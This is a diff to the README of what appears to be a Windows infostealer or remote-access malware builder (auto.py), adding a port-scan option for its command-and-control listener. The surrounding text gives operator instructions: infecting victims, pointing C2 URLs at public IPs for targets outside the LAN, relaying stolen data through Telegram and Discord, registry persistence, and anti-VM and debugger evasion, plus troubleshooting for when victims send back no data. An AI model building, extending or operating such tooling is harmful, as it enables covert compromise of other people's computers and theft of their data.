@@ -664,6 +664,7 @@ python auto.py --discord <webhook_url>      :: set Discord relay
 python auto.py --persist                    :: enable registry persistence
 python auto.py --c2 http://1.2.3.4:9400/     :: set C2 URL (external targets)
 python auto.py --no-anti-vm                 :: disable VM/debugger checks (for VM testing)
+python auto.py --find-port                  :: auto-scan for a free port (9400-9500)
 python auto.py --clear-telegram             :: remove Telegram from config
 python auto.py --clear-discord              :: remove Discord from config
 ```
@@ -680,6 +681,7 @@ Options:
 | `--persist` | Enable registry Run key persistence (saved to config.json) |
 | `--c2 <url>` | Override C2 URL (e.g. `http://PUBLIC_IP:9400/`). Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
 | `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
+| `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json`. GUI: "FIND BEST PORT" button |
 | `--config` | Show saved relay settings and exit |
 | `--clear-telegram` | Remove Telegram token from config.json |
 | `--clear-discord` | Remove Discord webhook from config.json |
@@ -688,7 +690,7 @@ Options:
 With no arguments, `auto.py` asks: [1] GUI, [2] Terminal (interactive), [3] Quick infect.
 
 **Interactive terminal** commands: `infect`, `gui`, `telegram`, `discord`, `clear-telegram`,
-`clear-discord`, `relay`, `port`, `persist`, `config`, `tg-chatid <token>`, `build`,
+`clear-discord`, `relay`, `port`, `find-port`, `persist`, `config`, `tg-chatid <token>`, `build`,
 `install`, `test-listener`, `help`, `exit`. Invalid commands print a message without exiting.
 
 In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.
@@ -718,6 +720,8 @@ classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).
 - **DETECT LAN IP**: fills the C2 URL with `detect_ip()` output (for local testing).
 - **DETECT PUBLIC IP**: fetches `https://api.ipify.org` and fills the C2 URL (for
   external targets behind NAT).
+- **FIND BEST PORT**: scans ports 9400-9500, picks the first free one, updates the
+  port field and C2 URL. Saved to `config.json` on close.
 - **TEST C2**: TCP-connects to the C2 host:port to verify the listener is reachable.
 - **NAT warning**: shown when a private IP (RFC 1918) is detected, with port-forward
   instructions.
@@ -1153,6 +1157,7 @@ opened read-only with SQLite.
 | **Victim on external network returns no data** (v5) | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
 | Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
 | `inet_addr` / `connect` fails in debug.log | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
+| `OSError: [WinError 10048]` starting listener | Port is already in use by another process | Use `--find-port` (CLI) or the GUI "FIND BEST PORT" button to auto-scan for a free port |
 
 ---
 
